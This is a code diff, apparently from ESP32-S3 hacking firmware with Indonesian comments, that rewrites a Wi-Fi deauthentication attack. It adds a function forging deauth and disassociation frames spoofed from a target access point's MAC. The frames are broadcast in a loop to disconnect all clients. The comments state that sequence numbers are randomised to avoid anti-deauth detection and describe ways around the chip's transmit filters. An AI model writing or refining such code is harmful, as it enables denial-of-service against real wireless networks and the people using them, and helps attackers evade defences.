@@ -51,6 +51,22 @@ uint8_t deauthFrame[26] = { 0x00, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff
 uint8_t disasFrame[26]  = { 0x00, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
 
 
+void buildOptimizedDeauthFrame(uint8_t* frame, const uint8_t* dest, const uint8_t* src, const uint8_t* bssid, uint8_t reason, bool is_disassoc) {
+    frame[0] = is_disassoc ? 0xA0 : 0xC0;
+    frame[1] = 0x00;
+    frame[2] = 0x00;
+    frame[3] = 0x00;
+    memcpy(&frame[4], dest, 6);
+    memcpy(&frame[10], src, 6);
+    memcpy(&frame[16], bssid, 6);
+    
+    // Sequence di-random biar gak kedetect anti-deauth router
+    uint16_t seq = random(0, 4096);
+    frame[22] = (seq >> 4) & 0xFF;
+    frame[23] = ((seq & 0x0F) << 4);
+    frame[24] = reason; // Pake reason dynamic
+    frame[25] = 0x00;
+}
 
 // ... (beaconPacket, fakeSSIDs, rickRollLyrics, deauthFrame lu tetep sama) ...
 
@@ -107,43 +123,34 @@ void loopWiFi(void * pvParameters) {
             else if (isDeauthing && adaTarget) {
       if (!deauthUdahSetup) {
         esp_wifi_stop();
-        esp_wifi_set_mode(WIFI_MODE_APSTA); // S3 lebih "bocor" di mode APSTA
+        esp_wifi_set_mode(WIFI_MODE_APSTA); // Mode Dual biar S3 bingung
         esp_wifi_start();
-        esp_wifi_set_ps(WIFI_PS_NONE); // WAJIB MATIIN POWER SAVE
+        esp_wifi_set_ps(WIFI_PS_NONE);      // MATIIN POWER SAVE (WAJIB!)
         esp_wifi_set_promiscuous(true);
         esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
         deauthUdahSetup = true;
       }
 
-      uint8_t apMac[6];
-      stringToMac(targetTerkunci.mac, apMac);
+      uint8_t targetMAC[6], gatewayMAC[6];
+      stringToMac(targetTerkunci.mac, gatewayMAC); // Target BSSID (AP)
       uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-      for (int b = 0; b < 60; b++) {
-        uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
-        
-        // SUNTIK NILAI PAS MAU NEMBAK DOANG
-        deauthFrame[0] = 0xc0; // Deauth
-        memcpy(&deauthFrame[4], broadcast, 6);
-        memcpy(&deauthFrame[10], apMac, 6);
-        memcpy(&deauthFrame[16], apMac, 6);
-        deauthFrame[22] = seq & 0xFF;
-        deauthFrame[23] = (seq >> 8) & 0xFF;
+      // Peluru ala Bruce: Kita tembak AP dan Client sekaligus
+      uint8_t packet[26];
+      uint8_t reasons[] = {0x01, 0x04, 0x06, 0x07}; // Reason codes sakti
 
-        // TEKNIK DISASSN (Sering lolos filter hardware S3 dibanding deauth)
-        uint8_t disasPacket[26];
-        memcpy(disasPacket, deauthFrame, 26);
-        disasPacket[0] = 0xa0; // Change to Disassoc
+      for (int i = 0; i < 40; i++) {
+        uint8_t r = reasons[esp_random() % 4];
 
-        // TEMBAK PAKE en_sys_seq = true (Hardware Hijack)
-        // Interface STA biasanya lebih "longgar" validatornya
-        esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, true); 
-        esp_wifi_80211_tx(WIFI_IF_STA, disasPacket, 26, true);
+        // 1. Tembak Deauth: AP -> All Clients (Broadcast)
+        buildOptimizedDeauthFrame(packet, broadcast, gatewayMAC, gatewayMAC, r, false);
+        esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, true); // PAKE TRUE COK!
 
-        // BALIKIN KE NOL BIAR GAK KEDETECT SCANNER INTERNAL
-        deauthFrame[0] = 0x00; 
-        
-        delayMicroseconds(100);
+        // 2. Tembak Disassoc: AP -> All Clients (Broadcast)
+        packet[0] = 0xA0;
+        esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, true); // PAKE TRUE COK!
+
+        delayMicroseconds(150);
       }
       vTaskDelay(1 / portTICK_PERIOD_MS);
     }
